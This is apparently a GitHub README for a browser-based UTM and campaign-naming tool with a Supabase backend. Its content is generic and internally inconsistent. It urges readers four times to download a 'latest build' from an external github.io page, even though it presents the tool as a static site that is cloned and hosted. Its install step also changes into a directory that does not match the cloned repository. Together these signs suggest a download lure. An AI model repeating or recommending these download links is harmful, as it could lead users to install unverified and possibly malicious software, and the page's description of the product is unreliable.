# TradeNeon Marketing Cockpit v2026 - Marketing Tool 2026

> **TradeNeon Marketing Cockpit is a browser-based marketing utility for managing UTMs and standardizing campaign names, delivered as a static, Supabase-backed workflow in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/parkersamwkpz4818/tradeneon-campaign-tool?style=flat-square)](https://github.com/parkersamwkpz4818/tradeneon-campaign-tool)

---

<p align="center">
  <a href="https://parkersamwkpz4818.github.io/tradeneon-campaign-tool/">
    <img src="https://img.shields.io/badge/Download-TradeNeon%20Marketing%20Cockpit%20Latest-brightgreen?style=for-the-badge" alt="Download TradeNeon Marketing Cockpit">
  </a>
</p>

> **[Download TradeNeon Marketing Cockpit v2026](https://parkersamwkpz4818.github.io/tradeneon-campaign-tool/)**

---

[Download Latest Build](https://parkersamwkpz4818.github.io/tradeneon-campaign-tool/)

---

## About the Cockpit

TradeNeon Marketing Cockpit gives marketing teams a central way to prepare and maintain campaign tracking information. Instead of depending on disconnected spreadsheets or ad hoc naming, teams can manage UTM values and campaign labels through a more consistent process.

The application uses a static web architecture with Supabase support, combining straightforward publishing with centralized data workflows. It is intended as a lightweight browser-based cockpit for preparing campaigns, checking details, and maintaining tracking structures over time.

---

## Core Capabilities

- Organize UTM parameters for campaign tracking
- Create marketing names that follow shared conventions
- Run as a static site for uncomplicated deployment
- Use Supabase for connected data handling
- Access the tool through a web browser
- Bring greater structure to marketing operations
- Support lightweight campaign preparation and maintenance
- Reuse established naming and tracking patterns

---

## Installation

Clone the repository or obtain the project files, then serve the static application through a browser or deploy it with a compatible web host.

    git clone https://github.com/parkersamwkpz4818/tradeneon-campaign-tool.git
    cd campaign-control

For Supabase-enabled deployments, provide the necessary backend values before using the application. You can then run the site through your hosting environment or a local preview server.

---

## Using the Application

TradeNeon Marketing Cockpit can be used to create and inspect UTM values, apply naming standards, and keep campaign information uniform across marketing materials.

A common process looks like this:

1. Launch the web application.
2. Add new campaign information or revise an existing entry.
3. Apply the required naming conventions.
4. Save or synchronize the information through the Supabase workflow.
5. Reuse the resulting structure when preparing later campaigns.

When serving the static files locally, refresh the browser after making file changes so the updated content is loaded.

---

## Configuration

The application setup and Supabase connection values generally contain the configuration. For deployments that use environment-based settings, store those values in the hosting service or in a local configuration file consumed by the static application.

Example configuration pattern:

    {
      "supabaseUrl": "YOUR_SUPABASE_URL",
      "supabaseAnonKey": "YOUR_SUPABASE_ANON_KEY",
      "defaultCampaignPrefix": "brand"
    }

Replace the example values with settings appropriate for your workspace, naming rules, and connected data source.

---

## Requirements

- A current web browser
- Hosting that can serve an HTML-based static site
- Access to a Supabase project when backend storage is enabled
- Sufficient space for the application files and saved campaign records
- Working knowledge of UTM parameters and naming conventions

---

## Frequently Asked Questions

**How can I update the application?**  
Download the newest build from the project page, replace the files currently being hosted, and recheck the Supabase settings after deployment.

**Where are the settings managed?**  
Depending on the deployment approach, review the site configuration files or the environment settings provided by your hosting platform.

**Why is campaign data not appearing?**  
Verify the Supabase URL and key, confirm that the project grants the required access, and make sure the browser can connect to the configured endpoint.

**Is Supabase required?**  
The application is presented as Supabase-backed. Whether it can operate without the backend depends on the configuration of the static deployment.

**Where should I look for troubleshooting help?**  
Start with the repository files, deployment configuration, and settings for the connected service to identify the source of the problem.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
